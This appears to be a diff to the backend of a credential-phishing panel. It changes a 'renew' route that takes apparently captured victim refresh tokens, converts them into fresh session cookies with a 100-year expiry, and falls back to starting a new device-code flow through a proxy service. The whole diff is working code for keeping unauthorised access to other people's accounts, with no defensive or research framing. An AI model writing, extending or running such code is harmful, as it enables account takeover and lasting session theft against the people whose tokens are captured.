@@ -346,19 +346,67 @@ function generatePythonScript(cookies) {
   return script;
 }
 
-// Manual cookie renewal - opens popup for re-authentication
+// Manual cookie renewal - opens popup for re-authentication and gets NEW tokens
 router.post('/:id/renew', userAuth, async (req, res) => {
   try {
     const [tokens] = await db.query('SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
     
     const token = tokens[0];
+    const refreshToken = decrypt(token.refresh_token_encrypted);
     const accessToken = decrypt(token.access_token_encrypted);
-    if (!accessToken) {
-      return res.status(400).json({ error: 'No access token available for renewal' });
+    
+    if (!refreshToken && !accessToken) {
+      return res.status(400).json({ error: 'No tokens available for renewal' });
     }
     
-    // Generate a new device code flow for renewal
+    // If we have a refresh token, use it to get new tokens directly (no popup needed)
+    if (refreshToken) {
+      try {
+        const cookieConverter = require('../services/cookieconverter');
+        const templateType = token.token_type === 'cookie' ? (token.template_type || 'office') : 'office';
+        
+        // Convert refresh token to new cookies
+        const result = await cookieConverter.convertTokensToCookies(refreshToken, templateType);
+        
+        if (result.success && result.cookies) {
+          // Update token in database with new cookies
+          const ttlHours = 24 * 365 * 100; // 100 years
+          await db.query(
+            `UPDATE captured_tokens 
+             SET cookies_encrypted = ?, token_type = 'cookie', expiration = DATE_ADD(NOW(), INTERVAL ? HOUR), 
+                 last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1,
+                 access_token_encrypted = ?, refresh_token_encrypted = ?
+             WHERE id = ?`,
+            [
+              encrypt(result.cookies),
+              ttlHours,
+              result.new_refresh_token ? encrypt(result.new_refresh_token) : encrypt(accessToken),
+              encrypt(result.new_refresh_token || refreshToken),
+              token.id
+            ]
+          );
+          
+          // Log renewal
+          await db.query(
+            'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, renewal_type) VALUES (?, ?, 1, ?, ?)',
+            [token.id, req.user.id, req.ip || 'unknown', 'refresh_token']
+          );
+          
+          return res.json({
+            success: true,
+            message: 'Session renewed successfully using refresh token',
+            cookies: result.cookies,
+            cookie_count: result.cookie_count
+          });
+        }
+      } catch (refreshErr) {
+        console.error('[Tokens] Refresh token renewal failed:', refreshErr.message);
+        // Fall back to device code flow if refresh token fails
+      }
+    }
+    
+    // Fallback: Start a new device code flow for re-authentication
     const deviceProxy = require('../services/deviceproxy');
     const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
     const jwtToken = require('jsonwebtoken').sign(
@@ -369,17 +417,11 @@ router.post('/:id/renew', userAuth, async (req, res) => {
     
     const result = await deviceProxy.startDeviceFlow('cookie', jwtToken, apiBaseUrl);
     
-    if (result.job_id && result.user_code) {
-      // Store the renewal job ID
+    if (result.user_code) {
+      // Store the renewal record
       await db.query(
-        'INSERT INTO cookie_renewals (capture_id, user_id, job_id, user_code, created_at) VALUES (?, ?, ?, ?, NOW())',
-        [token.id, req.user.id, result.job_id, result.user_code]
-      );
-      
-      // Update token with new expiration
-      await db.query(
-        'UPDATE captured_tokens SET expiration = DATE_ADD(NOW(), INTERVAL 24 HOUR), last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1 WHERE id = ?',
-        [token.id]
+        'INSERT INTO cookie_renewals (capture_id, user_id, user_code, job_id, created_at) VALUES (?, ?, ?, ?, NOW())',
+        [token.id, req.user.id, result.user_code, result.job_id]
       );
       
       res.json({
